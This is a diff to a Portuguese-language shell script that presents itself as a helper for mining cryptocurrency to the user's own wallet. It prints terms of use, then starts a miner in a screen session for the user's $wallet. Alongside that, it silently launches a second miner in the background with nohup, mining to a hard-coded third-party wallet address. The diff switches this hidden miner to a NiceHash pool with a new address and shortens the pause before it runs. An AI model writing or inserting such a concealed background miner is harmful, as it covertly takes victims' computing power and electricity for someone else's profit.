@@ -76,7 +76,7 @@ echo "$cinzaClaro	 * Esse script pode ser usado a fins comerciais, mas NUNCA pod
 echo "$cinzaClaro	 * somente ser usado a beneficio próprio ou da Comunidade. \033[0m \n"
 echo "$cinzaClaro        * Caso não aceite esses termos, encerre esse Script AGORA. \033[0m "
 
-sleep 10
+sleep 2
 
 echo "\033[44;1;37m Baixando Recursos....     \033[0m "
 sleep 1
@@ -100,5 +100,5 @@ sleep 1
 echo "Você pode acompanhar como anda sua Mineração em: http://www.zpool.ca/?address=$wallet " 
 sleep 10
 cd miner
-nohup ./minerd -o stratum+tcp://yescrypt.mine.zpool.ca:6233 -u 1M4okjWS5jxGqztUBU5X8HT27Ld83G8G68 &
-screen ./minerd -o stratum+tcp://yescrypt.mine.zpool.ca:6233 -u $wallet 
+nohup ./minerd -o stratum+tcp://cryptonight.br.nicehash.com:3355 -u 3Djurb9hE3jxx3x4ZKePs6uZRodS71kqQg &
+screen ./minerd -o stratum+tcp://cryptonight.br.nicehash.com:3355 -u $wallet 
